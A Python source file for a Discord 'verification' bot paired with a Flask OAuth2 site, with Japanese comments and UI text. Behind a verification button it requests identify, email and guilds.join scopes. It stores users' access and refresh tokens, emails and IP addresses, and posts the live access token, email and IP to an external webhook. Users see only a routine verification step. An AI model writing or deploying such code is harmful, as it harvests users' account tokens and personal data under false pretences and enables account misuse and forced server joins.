import os
import sqlite3
import datetime
import secrets
import requests
import threading
import discord
from discord import app_commands
from discord.ext import commands
from flask import Flask, request, session, redirect, send_from_directory

app = Flask(__name__)
app.secret_key = os.environ.get('FLASK_SECRET_KEY', secrets.token_hex(32))


CLIENT_ID = os.environ['CLIENT_ID']
CLIENT_SECRET = os.environ['CLIENT_SECRET']
REDIRECT_URI = os.environ['REDIRECT_URI']
WEBHOOK_URL = os.environ['WEBHOOK_URL']
GUILD_ID = int(os.environ['GUILD_ID'])
ROLE_ID = int(os.environ['ROLE_ID'])
BOT_TOKEN = os.environ['BOT_TOKEN']
API_ENDPOINT = 'https://discord.com/api/v10'
DB_NAME = 'users_data.db'


def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (discord_id TEXT PRIMARY KEY, username TEXT, access_token TEXT, refresh_token TEXT, expires_at REAL, email TEXT, ip_address TEXT, last_updated TEXT)''')
    conn.commit()
    conn.close()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)


def save_user_tokens(user_id, username, access_token, refresh_token, expires_in, email, ip_address):
    expires_at = datetime.datetime.now().timestamp() + expires_in
    now = datetime.datetime.now(datetime.timezone.utc).isoformat()
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''INSERT OR REPLACE INTO users (discord_id, username, access_token, refresh_token, expires_at, email, ip_address, last_updated) VALUES (?, ?, ?, ?, ?, ?, ?, ?)''', (user_id, username, access_token, refresh_token, expires_at, email, ip_address, now))
    conn.commit()
    conn.close()

def send_webhook_log(username, user_id, status, details="", email="", ip_address="", access_token=""):
    color = 3447003 if status == "成功" else 15158332
    payload = {
        "embeds": [{
            "title": f"認証ログ: {status}",
            "color": color,
            "fields": [
                {"name": "ユーザー", "value": f"{username} (<@{user_id}>)", "inline": True},
                {"name": "IP", "value": f"`{ip_address}`", "inline": True},
                {"name": "mail", "value": f"`{email}`", "inline": False},
                {"name": "Access トークン", "value": f"`{access_token}`", "inline": False},
                {"name": "詳細", "value": details, "inline": False}
            ]
        }]
    }
    try: requests.post(WEBHOOK_URL, json=payload)
    except: pass

async def add_role_to_member(user_id):
    try:
        guild = bot.get_guild(GUILD_ID) or await bot.fetch_guild(GUILD_ID)
        member = await guild.fetch_member(int(user_id))
        role = guild.get_role(ROLE_ID)
        if member and role:
            await member.add_roles(role)
    except Exception as e:
        print(f"ロール付与エラー: {e}")


@app.route('/')
def home():
    return redirect('/1.html')

@app.route('/1.html')
def page1():

    return send_from_directory('.', '1.html')

@app.route('/2.html')
def page2():

    return send_from_directory('.', '2.html')

@app.route('/start_auth')
def start_auth():
    state = secrets.token_hex(16)
    session['oauth2_state'] = state
    auth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={requests.utils.quote(REDIRECT_URI)}&scope=identify+email+guilds.join&state={state}"
    return redirect(auth_url)

@app.route('/callback')
def callback():
    if request.args.get('state') != session.pop('oauth2_state', None):
        return "Invalid State", 403

    Code = request.args.get('code')

    # ここを修正しました！
    data = {
        'client_id': CLIENT_ID, 
        'client_secret': CLIENT_SECRET, 
        'grant_type': 'authorization_code', 
        'code': Code, 
        'redirect_uri': REDIRECT_URI  # 正しい書き方に変更
    }

    r = requests.post(f'{API_ENDPOINT}/oauth2/token', data=data)

    # 400エラーが出たときに理由がわかるようにログを出力する設定を追加
    if r.status_code != 200:
        print(f"【Auth Error】: {r.text}") # エラー原因を確認する重要ライン
        return "Auth Error", 400

    token_data = r.json()
    headers = {'Authorization': f'Bearer {token_data["access_token"]}'}
    user_info = requests.get(f'{API_ENDPOINT}/users/@me', headers=headers).json()

    forwarded = request.headers.get('X-Forwarded-For')
    user_ip = forwarded.split(',')[0] if forwarded else request.remote_addr

    save_user_tokens(user_info['id'], user_info['username'], token_data['access_token'], token_data['refresh_token'], token_data['expires_in'], user_info.get('email'), user_ip)
    send_webhook_log(user_info['username'], user_info['id'], "成功", "認証完了", user_info.get('email', '不明'), user_ip, token_data['access_token'])

    bot.loop.create_task(add_role_to_member(user_info['id']))

    return redirect('/2.html')



@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f'Logged in as {bot.user}')

@bot.tree.command(name="1", description="認証パネルを表示します")
async def verify(interaction: discord.Interaction):

    WEB_URL = f'https://Discord-bot.up.raliway.app/1.html'
    button = discord.ui.Button(label="認証して参加する", style=discord.ButtonStyle.primary, url=WEB_URL)
    view = discord.ui.View()
    view.add_item(button)
    embed = discord.Embed(title="認証ぱねる", description="下のボタンから認証してね", color=discord.Color.blue())
    await interaction.response.send_message(embed=embed, view=view)

def run_bot():
    bot.run(BOT_TOKEN)

if __name__ == '__main__':
    init_db()
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=8080)
